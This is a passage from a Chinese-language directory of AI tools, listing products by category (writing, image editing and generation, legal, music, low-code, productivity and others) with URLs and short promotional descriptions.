上创建专业提案。易于使用，允许您从任何设备创建提案，构建可重复使用的配置文件，并添加关键字和语气等可选字段。 Detect GPT 综合写作 https://chrome.google.com 查看您浏览的页面是否包含 AI 生成的内容。Detect GPT 扫描您正在查看的网页内容并对其进行分析，以确定是否有任何内容是使用 GPT 语言模型生成的。 LuciaAI 综合写作 https://luciaai.com 高级AI写作助手。露西亚使用最新最先进的人工智能技术。使用 Lucia，您可以比以往更快更好地书写。 CaliberAI 综合写作 https://caliberai.net CaliberAI 有助于将您因 AI 诽谤的风险降至最低。它近乎实时地标记高风险内容，专为协助编辑和加强人工监督而设计。具有根据您组织的风险承受能力量身定制的自定义阈值的 API。 HelloScribe 综合写作 https://helloscribe.ai 更好的写作。伟大的想法。变得简单。向 10 倍更快的写作和头脑风暴问好，没有创意障碍或浪费时间。HelloScribe 易于使用的 AI 工具可帮助 PR 和营销专业人员更智能地工作。 WordAI 综合写作 https://wordai.com 使用 AI 将您的内容输出提高 10 倍。使用人工智能来缩短周转时间、增加预算并创建更多 Google 和读者会喜欢的高质量内容。 Wordtune 综合写作 https://wordtune.com Wordtune 是终极 AI 写作工具，可以重写、改写和改写您的作品！Wordtune 受到超过 1,000,000 名用户的信任，可以增强文章、学术论文、随笔、电子邮件和任何其他在线内容。 Redacta.me 综合写作 https://redacta.me 您的虚拟社区经理。使用人工智能快速、轻松、经济地创建原始西班牙语文本。我们专门训练人工智能用西班牙语写出好的文章。 Othersideai 综合写作 https://othersideai.com 您的个人写作助理。无论您在哪里写作，HyperWrite/OthersideAI 都会提供建议和句子补全来改进您的写作。 Glasp 综合写作 https://glasp.co Glasp 是一种社交网络荧光笔，人们可以使用它来突出显示和组织来自网络的引用和想法，而无需在屏幕之间来回切换，并同时访问其他志趣相投的人的学习成果。为人类留下您的数字遗产，同时为自己工作。他们还提供了一个总结 Youtube 视频的工具。 ParagraphAI 综合写作 https://paragraphai.com ParagraphAI 是一款人工智能写作应用程序，可以编写清晰、简洁、无错误的内容。 DREAM.page 综合写作 https://dream.page 借助 AI 的魔力写作和发布！立即加入候补名单。 Maester.app 综合写作 https://maester.app 使用我们直观的模板引擎释放 GPT-3 的全部潜力。快速生成根据您的重复需求量身定制的自定义输出，并与全世界分享。它可以在内容管理、大学和工作以及软件开发方面为您提供帮助。 Elephas 综合写作 https://elephas.app 唯一与您的 Mac 集成的 AI 编写器。跨应用程序工作。 Sudowrite 综合写作 https://sudowrite.com 用我们神奇的写作 AI 打破作家的瓶颈。您随时可用的头脑风暴伙伴。无需寻找 Beta 读者即可获得 Beta 反馈。“展示，而不是讲述”？我们有一个按钮。 Lex 综合写作 https://lex.page 解锁你最好的写作 HandyPlugins 综合写作 https://handyplugins.co Handywriter 是一款人工智能写作助手，可以帮助您为 WordPress 创建内容。它可以检查抄袭，甚至可以修复语法和拼写错误。 Penelope AI 综合写作 https://penelope-ai.vercel.app 一个成熟的人工智能写作助手。毫不费力地加快您的写作速度 - 释义、总结、生成故事或 AI 自动完成。 Giftastic.ai 礼物创意 https://giftastic.ai Giftastic.AI 是一个个性化的礼物推荐引擎，它使用您要购物的人的个人特征，并推荐他们会喜欢和欣赏的独特而贴心的礼物。 Gifts Genie 礼物创意 https://gen.gifts Genie 是一款由 AI 驱动的生日礼物创意生成器。无需再费力想出完美的礼物 - 只需告诉生成器一些关于此人的事情，它就会为您生成礼物创意。它旨在减轻送礼的压力。 Suggest Gift 礼物创意 https://suggest.gift 您是否正在为寻找送给心爱之人的完美礼物而苦恼？不要再观望！我们的工具使用最新的 AI 技术来帮助您发现完美的礼物。告别送礼的压力，让我们的技术为您代劳。 Cool Gift Ideas 礼物创意 https://coolgiftideas.io 送出完美的礼物！根据每个人的身份发现适合他们的创意礼物。 Elf Help 礼物创意 https://elfhelp.ai 节日礼物 inspo。Elf Help 是您的终极送礼助手，可为您列表中的每个人免费提供富有创意和个性化的建议。 Whisper AI 医疗保健 https://whisper.ai 这是一款人工智能助听器。借助 AI，它可以学习并适应不同的听力情况，例如嘈杂的购物市场或家庭聚会。它提供从新功能到声音处理的定期软件升级。 Cradle 医疗保健 https://cradle.bio Cradle 使用强大的预测算法和 AI 设计建议帮助生物学家在创纪录的时间内设计出改进的蛋白质。 SwagAI 人力资源 https://useslingshot.com SwagAI 是一种 AI 工具，可以帮助你想出可笑的公司 swag。只需告诉我们您在寻找什么，我们的算法就会推荐疯狂（但有时实用）的选项。 Autumn AI 人力资源 https://getautumn.com 在没有调查的情况下测量倦怠并防止它。Autumn 与您已经使用的工具相关联，利用 AI 帮助您识别倦怠的早期迹象，并在您的团队中发现模式，例如增加会议、减少 1:1 的频率或周末发送更多消息。不仅仅是数据——秋季也能帮助您采取行动！在每次 1:1 之前获得 1:1 问题提示，为您的团队量身定制，这样您就不必怀疑自己是否提出了正确的问题。每周都会向您发送团队见解，通过 Slack 中有趣且互动的每周总结，帮助您的团队无需额外努力（或其他 Zoom 社交）就能感受到联系。 Dost 人力资源 https://getdost.com 使用 Dost 的 AI 支持的 Slack 和 MSTeams 应用程序创建安全、无偏见、无微攻击、包容的消息。 GeniusReview 人力资源 https://geniusreview.xyz 360° AI 性能评估。使用 GeniusReview 为您的绩效评估问题获得量身定制的答案，从而节省大量时间。 Moveworks 人力资源 https://moveworks.com Moveworks 是第一个使用 AI 解决工作问题和预防问题的员工体验平台。它会自动解决请求、传达更改并向您的团队展示下一步要解决的问题——让您将沮丧的时刻变成神奇的时刻。由于我们的对话式 AI（聊天机器人）精通 100 多种语言，因此 Moveworks 可以在全球范围内提供从总部到家庭办公室的即时帮助。 HireYaY 人力资源 https://hireyay.com 再也不会错过合格的候选人。使用 AI 制作引人入胜的招聘广告。一键分发给百万求职者 JobtitlesAI 人力资源 https://jobtitlesai.com 准确限定任何职位。我们的机器学习 API 将职位分为两类：领域（销售、财务、IT..）和职位（执行官、管理、助理...），因此您可以优先考虑您感兴趣的职位。 Magic Eraser 图像编辑 https://magiceraser.io 在几秒钟内从图像中删除不需要的东西。上传图像，标记您需要删除的位，下载修复后的图像。 Photoroom 图像编辑 https://photoroom.com 仅使用您的手机创建产品和肖像图片。删除背景、更改背景和展示产品。 Green Screen AI 图像编辑 https://greenscreenai.com Green Screen AI 可让您将图片背景更改为您能想到的任何内容！使用生成式 AI，您可以将您的狗放在外星丛林中，或者将您的猫变成太空牛仔。 Nostalgia Photo 图像编辑 https://nostalgia.photo Nostalgia Photo 使用最新的尖端人工智能技术让旧照片重现生机。只需点击几下和几美分即可获得最高分辨率。 RestorePhotos 图像编辑 https://restorephotos.io 为所有人使用 AI 修复旧照片。有旧的和模糊的面部照片吗？让我们的 AI 恢复它们，让这些记忆得以延续。100% 免费 – 立即恢复您的照片。 Remove.bg 图像编辑 https://remove.bg 一键式在 5 秒内自动 100% 删除背景。多亏了 remove.bg 的智能 AI，您可以缩短编辑时间 - 并获得更多乐趣！ Perfectly Clear Video 图像编辑 https://eyeq.photos Perfectly Clear Video 提供即时、自动的照片校正和视频增强功能。是全球领先的图像自动校正和AI视频增强提供商。 AI. Image Enlarger 图像编辑 https://imglarger.com 多合一 AI 工具包可帮助您增强和提升图像质量。在不损失质量的情况下提高图像分辨率。 Bg.Eraser 图像编辑 https://bgeraser.com 强大的人工智能修复和图片清理技术。在几秒钟内删除不需要的对象和水印。 Hama - Image Editing 图像编辑 https://hama.app 瞬间擦除图像中的人物或物体。 Topaz Photo AI 图像编辑 https://topazlabs.com 在自动驾驶仪上最大化您的图像质量。使用明天的技术锐化、消除噪点并提高照片的分辨率。Topaz Photo Al 可增强您的图像质量，让您可以专注于摄影的创意部分。 Palette.fm 图像编辑 https://palette.fm 自动为黑白图片着色，无需注册，而且免费！ Visio Studio 图像编辑 https://visio.studio 先进的背景去除工具，由计算机视觉技术提供支持。Visio Studio 允许您直接从手机编辑和优化图片。 Evoto AI 图像编辑 https://evoto.ai Evoto 是下一代照片编辑器，可将您从繁琐的工作中解放出来，让您以 10 倍的速度处理数千张照片并获得卓越的质量，并帮助您将想象力变为现实。 Erase.bg 图像编辑 https://erase.bg 免费从图像中删除背景。从人类、动物或物体的图像中去除背景，并免费下载高分辨率图像。 Bria 图像编辑 https://bria.ai 集成 Bria 的人工智能 API 以自动化和扩展视频和图像的创建。 QuickTools by Picsart 图像编辑 https://tools.picsart.com 借助 Picsart Quicktools，您可以访问范围广泛的工具，从而轻松转换文件类型、创建自定义日历、增强图像等。所有这些工具都方便地位于一个地方。 Radiant Photo 图像编辑 https://radiantimaginglabs.com 你的照片应该是容光焕发的。获得具有完美色彩再现的优质成品照片，并在创纪录的时间内交付给您。您的照片 — 简直容光焕发。他们本来的样子。 Let's Enhance 图像编辑 https://letsenhance.io 图像增强器和升级器。自动 AI 编辑器可在不降低质量的情况下提高图像分辨率。一键让您的照片呈现最佳效果 Stable Horde 图像生成器 https://stablehorde.net 深度学习文生图模型工作者的众包分布式集群。还提供无需安装和技术专业知识的客户端界面 Go Charlie 图像生成器 https://gocharlie.ai 单击按钮即可创建图像、博客、广告、网站标题。 Stable Diffusion 图像生成器 https://stability.ai Stable Diffusion 是一种深度学习的文本到图像模型，于 2022 年发布。它主要用于生成以文本描述为条件的详细图像，但它也可以应用于其他任务，例如修复、修复和生成图像到- 由文本提示引导的图像翻译。 Getimg.ai 图像生成器 https://getimg.ai 使用 AI 创建图像所需的一切。神奇的 AI 艺术工具。生成原始图像、修改现有图像、将图片扩展到原始边界之外等等。 Aragon - Image Generation 图像生成器 https://aragon.ai 使用 AI 以 10 倍的速度创建令人惊叹的艺术作品和图像。 RocketAI 图像生成器 https://rocketai.io 设计的未来是可编程的。Rocket AI 是一个 SaaS 平台，可使用 AI 创建和编辑产品图像并改善电子商务销售和广告效果。我们为电子商务企业提供人工智能解决方案，以改善他们的产品形象，并从简单的文本提示中产生新的想法和设计概念。 Pollinations 图像生成器 https://pollinations.ai Pollinations 希望使创造力多样化，并通过数字生态系统传播它。无论是图像、视频还是音频，我们都邀请人们借助 AI 想象新世界。对于公司，我们的开发人员在最新的 AI 模型之上编写代码，提供定制的结果和特定的美学。借助 API，AI 创作可以直接集成到网站和社交媒体平台中。创作变得简单、快速和有趣。 Diffusion Land 图像生成器 https://diffusion.land Diffusion Land 允许您使用各种 AI 模型来生成图像。他们还有几个预建的概念，您可以使用这些概念来生成某些类型的图像。 DallE-2 图像生成器 https://openai.com DALL·E 2 可以根据文字描述创建原创、逼真的图像和艺术作品。它可以组合概念、属性和样式。 Getalpaca 图像生成器 https://getalpaca.io alpaca 是一个 Photoshop 插件，用于将 AI 图像生成能力与人类技能相结合。 Canva Text to Image 图像生成器 https://canva.com 可生成您描述的任何图像的全新技术。 Stock AI 图像生成器 https://stockai.com 获得完美的图像。每次。准确找到您需要的图像。如果它不存在，我们会立即为您创建。 Craiyon 图像生成器 https://craiyon.com AI 模型从任何提示中绘制图像！ Soreal.AI Studio 图像生成器 https://soreal.ai AI图像生成入门最简单的方法 Imgcreator 图像生成器 https://imgcreator.zmo.ai 使用文本创建图像。生成基于文本的图像以帮助您思考和创作。 Stylized 图像生成器 https://stylized.ai 几秒钟内即可获得专业的产品照片。Stylized 使用人工智能创建令人惊叹的产品照片和社论 - 无需工作室 Artssy 图像生成器 https://artssy.co 使用 Artssy AI 一键创建无限图像，探索无限可能的世界。当您可以立即创建完美的图像时，停止为免版税的照片付费。 Nijijourney 图像生成器 https://nijijourney.com 动漫迷的 NijiJourney AI。新的 niji 模型经过精心调整，可以制作动漫和插画风格。它对动漫，动漫风格和动漫美学有更多的了解。它非常适合动态和动作镜头，以及一般以角色为中心的构图。 Roll Art Die 图像生成器 https://roll-art-die.com 在您的 Apple Silicon 设备上使用 StableDiffusion。仅使用文本生成 AI 艺术品。将您梦想中的艺术品变为现实。无需云订阅。 Dreamer 图像生成器 https://slashdreamer.com 将 Notion 中的 Stable Diffusion 集成到 AI 中，使用新的斜杠命令生成图像。 Enterpix 图像生成器 https://enterpix.app 人工智能生成的图像搜索引擎。 Xno.ai 图像生成器 https://xno.ai 使用 39 个 GPU 探索 19 个顶级文本到图像 AI。 Spellbook 法律助手 https://spellbook.legal 使用 AI 起草合同的速度提高了 3 倍。Spellbook 使用 GPT-3 在 Microsoft Word 中审查和建议合同语言。Spellbook 接受了数十亿行法律术语的培训，可以立即为您的合同建议语言。 Casetext 法律助手 https://casetext.com 发现 Lexis 和 Westlaw 遗漏案例的现代搜索技术。不要冒失去先例的风险。以实惠的价格获得更快、更准确的法律研究。 Detangle.ai 法律助手 https://detangle.ai Detangle 为您提供 AI 生成的法律文件摘要，以便您真正理解它们。 Activazon 法律助手 https://activazon.com Activazon 是一项犯罪报告分析服务，旨在让居民和访客了解在他们的社区和其他地方发生的活动。 Legal Robot 法律助手 https://legalrobot.com 法律建议需要仔细分析法律及其如何适用于特定情况。Legal Robot 提供通过自动分析与其他法律文件和判例法相关的法律文件而生成的信息。我们还提供语言和统计分析，帮助您了解法律文件中的潜在问题。 Ferret 法律助手 https://ferret.ai Ferret 无与伦比的 AI 应用程序，结合世界一流的信息，为您提供独家关系情报，可以帮助您避开高风险人群并发现有前途的机会。 DoNotPay 法律助手 https://donotpay.com 世界上第一个机器人律师。DoNotPay 应用程序是世界上第一位机器人律师的故乡。只需按一下按钮，就可以打击公司、打击官僚主义并起诉任何人。 Replika 生活助手 https://replika.com 关心的AI伴侣。总是在这里倾听和交谈。永远在你身边。 Find Your Next Book 生活助手 https://findyournextbook.ai Find Your Next Book 是一项图书推荐服务，旨在帮助那些难以决定阅读什么的人。只需根据人物、背景和/或情节描述您想要的读物，我们就会从我们的数千本书数据库中推荐最佳选择。 Thekeys 生活助手 https://thekeys.ai 您知道自己想说什么，只是不确定如何说。Keys 可帮助您以正确的方式说话，而不会改变您的意图，或听起来像机器人。 AI Trip Planner 生活助手 https://buildai.space AI Trip Planner 是一款全球旅行计划应用程序，可为用户前往世界任何目的地的旅行自动创建详细的每日行程。所有用户需要做的就是指定他们的旅行长度和他们想要的目的地，应用程序将处理剩下的事情 Caktus 生活助手 https://caktus.ai 为学生撰写论文、讨论问题、一般编码帮助和专业工作申请帮助提供的 AI 解决方案。 JustLearn 生活助手 https://justlearn.com 您可以使用 Justlearn 创建 AI 朋友并与他们交谈。 BlackInk 生活助手 https://blackink.ai 在几秒钟内创建您自己独特的闪光纹身。停止花费数月时间在 Pinterest 上搜索你的下一个纹身。使用 BlackInk 的 AI 在几秒钟内生成定制的独特纹身，专为您打造类似纹身的设计。 Write Me A Cover Letter 生活助手 https://WriteMeACoverLetter.com 使用 AI 在几秒钟内生成求职信。只需上传您的简历，分享您想要的工作的链接，剩下的交给我们。 TinyWow 生活助手 https://tinywow.com 人工智能驱动的实用工具，让您的生活更轻松。最常见的工具包括 PDF、视频、图像、AI 写入和转换工具。 Prodigy AI 生活助手 https://ai.prodi.gg 面向开发人员的 GPT 职业教练。根据您的独特技能、经验和目标，立即获得个性化的职业建议和指导。通过人工智能。 Circle Labs 生活助手 https://circle.isyourshadowyou.com 我们制造的 AI 是您真正愿意花时间与之交谈的。有个性、有棱有角的人工智能。 Elektrif AI 生活助手 https://elektrif.ai 做最好的自己，永远不要无话可说，花更多的时间去真正了解一个人。Elektrif.AI 使用 GPT3 生成个性化的对话开场白、改写您的消息以使其更具吸引力等。 Resume Worded 生活助手 https://resumeworded.com 改善您的简历和 LinkedIn 个人资料。我们的人工智能平台由顶级招聘人员设计，可立即为您的简历和 LinkedIn 个人资料提供量身定制的反馈。获得 5 倍以上的面试、机会和工作机会。 Reggi 生活助手 https://yfj.social Reggi 帮助您在实时商店中跟踪您的购买和预算，在您购物时将正确的税费应用到您的小计中。整体无压力的购物体验。 Brandmark Logo 生成器 https://brandmark.io 为您的企业创建独特、专业的徽标。使用我们免费的 AI 驱动设计工具，为您的下一个徽标项目获取颜色和字体创意。 Looka Logo 生成器 https://looka.grsm.io Looka Logo Maker 将您的徽标设计偏好与人工智能相结合，帮助您创建自己喜欢的自定义徽标。 Make Logo AI Logo 生成器 https://makelogoai.com 不到一杯咖啡的设计师品质标志。高清+透明背景。在不到 24 小时内交付。商业里 Namecheap Logo Maker Logo 生成器 https://namecheap.com 只需回答几个问题，即可免费下载数百个徽标。 Sitekick 低代码/无代码 https://sitekick.ai Sitekick 是一个 AI 登陆页面构建器。它允许您创建漂亮的登录页面，而无需编码、设计或文案写作技能。 Robovision.ai 低代码/无代码 https://robovision.ai 打造有效的动态视觉 AI。Robovision 提供涵盖整个 AI 生命周期的视觉 AI 平台。在当今不断变化的商业环境中简化开发、实施和调整 AI 的整个过程。 Dust 低代码/无代码 https://dust.tt 设计和部署大型语言模型应用程序。快速工程，重新构想🔥 建立在多年使用大型语言模型的经验之上。为了一个目标，帮助加速他们的部署。 Neon AI 低代码/无代码 https://neon.ai 使用 Neon AI 的支持技术创建最先进的语音应用程序。Neon AI SDK 将高级人工智能和自然语言理解集成到一个紧密结合的软件工程平台中。想想 Amazon Alexa、Google Home、Apple Siri 和 Microsoft Cortana - 以及免费的开源软件。他们还在其网站上列出了适用于 Mycroft Mark II 的 AI 操作系统。 VWO 低代码/无代码 https://vwo.com 将您的访问者变成付费客户。立即设置您的第一个实验。 Durable AI 低代码/无代码 https://durable.ai 我们的使命是使用能够进行人类推理和对话的可解释 AI 来转变对定制软件的访问。我们设想的未来是，自定义、灵活和耐用的软件将民主化并可供所有人使用。 Teleporthq 低代码/无代码 https://teleporthq.io TeleportHQ 是具有集成 UI 开发和内容建模工具的协作前端平台。一个强大的可视化构建器，可立即创建和发布您的无头静态网站。 Debuild 低代码/无代码 https://debuild.app 快速构建 Web 应用程序。 Monitaur 低代码/无代码 https://monitaur.ai 获得可根据您的业务扩展的有据可查的合乎道德的 AI。Monitaur 可帮助您审核、跟踪和记录 AI 和算法的实时结果，以实现最佳性能和合规性。我们的平台旨在与接触您的 AI 的每个团队集成。 Teachable Machine 低代码/无代码 https://teachablemachine.withgoogle.com Teachable Machine 是一种基于网络的工具，可以让每个人快速、轻松地创建机器学习模型。它旨在供教育工作者、艺术家、学生、创新者、各种类型的制造者使用——实际上，任何有想法想要探索的人。不需要必备的机器学习知识。 Brancher AI 低代码/无代码 https://brancher.ai 通过让用户能够将 AI 模型连接在一起并生成独特的 AI 驱动的应用程序，让所有人都能访问 AI。货币化并与世界分享您的创作。 Axiom 低代码/无代码 https://axiom.ai Axiom 是一种浏览器扩展程序，可通过在任何网站或 Web 应用程序上自动执行网站操作和重复性任务来帮助您节省时间。 Roboflow 低代码/无代码 https://roboflow.com 给你的软件一种既视感。只需几张图片，您就可以在下午训练一个可以工作的计算机视觉模型。 Nanonets 低代码/无代码 https://nanonets.com 使用 AI 自动执行手动数据输入！立即从文档、文本、图像和电子邮件中捕获数据。减少周转时间和所需的手动工作。基于 OCR（光学字符识别）的 AI 平台。 Lobe 低代码/无代码 https://lobe.ai Lobe 使用免费、易于使用的工具帮助您训练机器学习模型。它只需向它展示您希望它学习的示例，它就会自动训练可以在您的应用程序中发布的自定义机器学习模型。 Liner.ai 低代码/无代码 https://liner.ai Liner 是一款免费工具，可让您轻松训练 ML 模型。它获取您的训练数据并为您提供易于集成的 ML 模型。无需编码或机器学习方面的专业知识。 Cogniflow 低代码/无代码 https://cogniflow.ai 从文本、图像或音频构建 AI 的最简单方法。几分钟后。无需代码。 Build AI 低代码/无代码 https://buildai.space Build AI 可帮助您在几分钟内构建 AI 应用程序。您将能够完全自己构建应用程序并发布它。您将能够根据需要对其进行更新，包括改进和完善您的提示，使您的应用达到最佳状态 Felvin 低代码/无代码 https://felvin.com Felvin 使非开发人员能够创建、发现 AI 应用程序并从中获利。我们的无代码工具使您可以轻松创建 AI 应用程序并将它们放在 SEO 优化的图库中以供发现。 Seek 低代码/无代码 https://seek.ai 智能数据层。询问您的任何数据并立即获得答案 Lightning AI 低代码/无代码 https://lightning.ai 闪电般快速地构建模型和全堆栈 AI 应用程序。使用 Lightning App 模板构建模型和 AI 驱动的云应用程序，无需 DIY 基础设施、成本管理、扩展和其他令人头疼的问题。 Browse AI 低代码/无代码 https://browse.ai 从任何网站提取和监控数据的最简单方法。在 2 分钟内训练一个机器人。无需编码。 Softr Studio 低代码/无代码 https://softr.io 为您的企业构建自定义应用程序，就像乐高积木一样简单。使用他们的 AI，只需单击一下即可在 Softr 中生成图像和复制。将您的 Airtable 或 Google Sheets 变成客户门户、合作伙伴应用程序或内部工具。 Symanto Text Insights 低代码/无代码 https://symanto.com 市场领先的 NLP API。通过实时分析和简单的系统集成，利用文本数据获得更好的业务洞察力。 Mutiny 低代码/无代码 https://mutinyhq.com Mutiny 是一个无代码 AI 平台，可帮助营销人员在没有工程师的情况下将他们的漏斗顶部需求转化为收入。 Zevi.ai 低代码/无代码 https://zevi.ai 通过 AI 驱动的搜索和发现解决方案改善业务成果 通过以意图为中心、易于集成的网站搜索引擎引导您的潜在客户从发现到转化，这有助于提高参与度和销售额 Riku.ai 低代码/无代码 https://riku.ai 使您无需代码即可构建 AI 模型。通过集成、API 或公共共享链接使用 AI。每个人都可以访问 AI。 AI Surge Cloud 低代码/无代码 https://ai-surge.cloud AI Surge 是一个无代码决策智能平台，可帮助企业构建生产优先的 ModelOps 管道，无需编写一行代码即可将数据科学带入生活。这就像没有数据科学家的数据科学。我们正在帮助企业将数据交付速度提高 10 倍，并将成本降低 90%。 10Web 低代码/无代码 https://10web.io AI - 供电的 WordPress 平台。至少可以说，自动化的网站构建器、托管和 PageSpeed Booster。 Retune 低代码/无代码 https://retune.so 使用 GPT-3 创建微调语言模型并从中获利的终极工具。借助 re:tune，您可以轻松地为任何行业或用例训练和定制您自己的 AI 助手，并生成 API 以将其集成到您自己的应用程序中。 Heyday 记忆 https://heyday.xyz Heyday 是一款由 AI 驱动的记忆助手，可以重新显示您在浏览网页时忘记的内容。记住更多你学到的东西。自动地。 Personal.ai 记忆 https://personal.ai PersonalAI 是一种 AI 工具，可以以思维的速度产生新想法、回忆关键概念和编写原创内容。新想法的自动编目和您存储的所有内容的集中知识中心。 Rewind AI 记忆 https://rewind.ai Rewind 是您生活的搜索引擎。这是一款专为隐私设计的 macOS 应用程序，可让您找到您所见、所说或所听的任何内容。 Natural Language Playlist 音乐 https://naturallanguageplaylist.com AI 生成混音带和播放列表。输入一个句子作为提示，并返回由 AI 策划的歌曲列表！ Endel 音乐 https://endel.io 个性化音景可帮助您集中注意力、放松身心和入睡。以神经科学为后盾。 Harmonai 音乐 https://harmonai.org 我们是一个社区驱动的组织，发布开源生成音频工具，让每个人都能更轻松、更有趣地制作音乐 Riffusion 音乐 https://riffusion.com Riffusion 根据文本提示生成音乐。尝试您最喜欢的风格、萨克斯管或小提琴等乐器、阿拉伯语或牙买加语等修饰语、爵士乐或福音音乐等流派、教堂钟声或雨声等声音，或任意组合 Sonify 音乐 https://sonify.io Sonify 在音频、数据和新兴技术的交叉领域进行创新。我们设计和开发音频优先的产品和数据驱动的解决方案。 Beatoven.ai 音乐 https://beatoven.ai Beatoven.AI 使用先进的 AI 音乐生成技术来创作独特的基于情绪的音乐，以适合您的视频或播客的每个部分。 Amper 音乐 https://ampermusic.com Amper 的使命是让任何人都能通过音乐创造性地表达自己，无论他们的背景、专业知识或资源如何。Amper 构建由我们的 Creative AI 提供支持的工具，以帮助人们创作和定制原创音乐。他们还提供了一个 API，您可以使用它来创建自己的产品。 Soundful 音乐 https://soundful.com Soundful 使创作者只需单击一个按钮即可生成免版税曲目。Soundful 音乐的音质如此丰富，你不会相信它是用 AI 制作的。 Songtell 音乐 https://songtell.com Songtell 是有史以来第一个由 AI 生成的歌曲含义库，生成了超过 20000 首歌曲含义。您还可以订购印有您最喜爱歌曲含义的海报。查看他们的 subreddit r/songtell 了解更多详情！ Pop2Piano 音乐 https://sweetcocoa.github.io 从您想要的任何歌曲中播放基于流行音乐的钢琴翻唱。通过从列表中选择项目来更改钢琴翻唱的歌曲和风格。 Boomy 音乐 https://boomy.com 制作即时音乐并与世界分享。在几秒钟内创作原创歌曲，即使您以前从未制作过音乐。在 Spotify、TikTok、YouTube 和全球 40 多个其他平台上的每次收听都将获得报酬。 Open Voice OS 音乐 https://openvoiceos.com Open Voice OS 展示了开源语音 AI 在一系列设备上的强大功能。社区支持的 Linux 发行版。 Emergent Drums 音乐 https://audialab.com 使用人工智能生成独特的鼓样本。使用我们的突破性插件生成无尽的鼓样本，全部免版税。 Mubert 音乐 https://mubert.com Mubert - 面向内容创作者、品牌和开发商的全新免版税音乐生态系统 🔥。来看看我们的高品质音乐如何提升您的内容⏩！ Splashmusic 音乐 https://splashmusic.com 将音乐创作的乐趣带给每个人 Aiva 音乐 https://aiva.ai AIVA，人工智能音乐作曲家，可为您的项目创作原创和个性化的音乐。 Rephrasely 改写 https://rephrasely.com 释义是写作过程中很自然的一部分，因为它可以帮助您理清思路并使您的措辞适合您的听众。使用 Rephrasely 有助于构建和简化这项工作，我们的释义工具提供了 20 种模式，其中许多是免费的，以实现这一点。我们提供的 20 种模式多种多样，包括摘要工具、免费语法检查器、简化文本的模式和句子缩短器。 Paraphraser 改写 https://paraphrasetool.com Paraphrase Tool 使用 AI 生成 100 多种语言的文本变体。 Quillbot Paraphraser 改写 https://quillbot.com/ Quillbot 将重写您的文本。通过编写或粘贴内容然后单击释义来免费开始。 Tavus 个性化视频 https://tavus.io 认识 Tavus，这是一款程序化个性化视频工具，专为希望改变建立关系方式的顶级产品、营销和销售团队打造。录制一次并发现 Tavus 的力量，因为我们的 AI 会自动为大大小小的观众生成个性化视频。 Rephrase 个性化视频 https://rephrase.ai Rephrase 的技术可大规模创建超个性化视频，从而提高参与度和业务效率。 Windsor 个性化视频 https://windsor.io 向每一位客户发送个人视频，让他们永远不会忘记您的品牌录制一个视频，Windsor 的 AI 会向您的客户发送数百万个个性化副本。 BHuman 个性化视频 https://bhuman.ai 制作单个视频并为成千上万的收件人进行个性化设置。通过任何渠道交付并立即测量结果。您可以通过录制模板、连接数据然后生成个性化视频来实现。 Vidyo 个性化视频 https://vidyo.ai 立即将长视频制作成短视频。使用强大的 AI 从您现有的视频中创建短片 ✨ 节省 90% 的时间和精力。 DeepL 生产力 https://deepl.com DeepL 是世界上最准确、最细致的机器翻译。通过结合先进的 AI 技术和无与伦比的翻译准确性，它的准确度比最接近的竞争对手高出 3 倍以上。 Scale 生产力 https://scale.com 借助更好的数据，更快地从您的 AI 投资中获得价值。更好的数据会带来更高性能的模型。高性能模型导致更快的部署。 Oracle 生产力 https://askoracle.app Oracle 已经为您提供了所有答案。从 Oracle 获得即时答案，节省时间和精力。Ask Oracle 可以连接并回答来自 Slack、Docs 和 Notion 的问题。 Merlin 生产力 https://merlin.foyer.work Merlin 在您最喜爱的所有网站上为您提供 OpenAI 的 ChatGPT 的强大功能。例如：Gmail、g-sheets、Twitter、Linkedin 等。您在线搜索或写作的任何地方。使用 Merlin，您可以快速编辑电子邮件、撰写 Twitter 回复或创建 Excel 公式。 Enzyme 生产力 https://enzyme.com 酶 QMS 软件包括从设计控制到 CAPA 的产品开发生命周期所有阶段的模块。我们的内部专家随时为您提供支持！我们可以指导您完成质量挑战和监管提交流程。立即注册演示。 Albus 生产力 https://springworks.in Albus 是 Slack 内部的 AI 助手。您可以通过向应用程序发送消息直接向 Albus 提问。一些示例包括营销人员使用 Albus 为其目标受众创建个性化且引人入胜的内容，或者设计师可以使用 Albus 为新设计产生创意并创建独特且引人入胜的视觉内容。 Glean 生产力 https://glean.com 立即了解您的公司知道什么。收集公司所有应用程序的搜索，以帮助您准确找到您需要的内容并发现您应该了解的内容。 Marketplan 生产力 https://marketplan.io 一体化营销平台。从一个强大的地方计划、执行、规划和优化您的整个营销策略。 Alfred 生产力 https://alfredsearch.com Alfred 是适用于 iOS 的 GPT 聊天助手。它是一种新的人工智能搜索和内容创建引擎，将无广告搜索和内容创建结合到一个易于使用的应用程序体验中。在 OpenAI 开创性的 GPT-3 的支持下，Alfred 理解您的自然语言并提供准确且相关的答案。使用 Alfred，搜索和查找信息从未如此简单或方便。立即尝试，体验搜索和内容创建的未来。 Qatalog 生产力 https://qatalog.com 为工作定制的操作系统。Qatalog 是一种项目管理/协作 AI 工具，可以无缝管理人员、运营和知识。 Krisp 生产力 https://krisp.ai Krisp 的人工智能解决方案消除了会议中的背景噪音和回声，只留下人声。具有噪音和回声消除、小部件、洞察力和通话摘要等功能。 Mem.ai 生产力 https://mem.ai 让 AI 组织您团队的工作——从会议记录、项目到知识库。所有这些都可以立即搜索并且很容易被发现。 Reclaim AI 生产力 https://reclaim.ai 用于 Google 日历的任务管理和计划的 AI。Reclaim 为您的团队的优先事项创建完美的时间表，并通过智能、灵活和自适应的时间编排节省高达 40% 的工作周时间。 Xembly 生产力 https://xembly.com 一个自动化的参谋长来处理让你慢下来的任务。通过平凡的工作。专注于意义。 SlidesAI 生产力 https://slidesai.io 使用 AI 在几秒钟内创建演示幻灯片告别繁琐的手动幻灯片创建。让 AI 为您编写大纲和演示内容。使用他们的工具，您可以立即从任何文本轻松创建专业、引人入胜的幻灯片。适用于谷歌幻灯片。Microsoft Powerpoint 即将推出。 Noty.ai 生产力 https://noty.ai AI 会议助手将 Google Meet 转化为行动、任务和跟进。功能包括：实时转录和一键突出显示。AI 摘要和会议情报。自动跟进。 ChatGPT 生产力 https://chat.openai.com ChatGPT：优化对话的语言模型。对话格式使 ChatGPT 可以回答后续问题、承认错误、挑战不正确的前提并拒绝不适当的请求。 Supernormal 生产力 https://supernormal.com SuperNormal 是一个让队友可以全天发送异步视频更新的平台。使用 AI 支持的摘要进行快速视频更新有助于让团队保持更新和联系，而无需安排会议或跨时区同步。 Adobe Sensei 生产力 https://adobe.com 创建和提供理想的客户体验可能是一项复杂的任务。Sensei 使用 AI 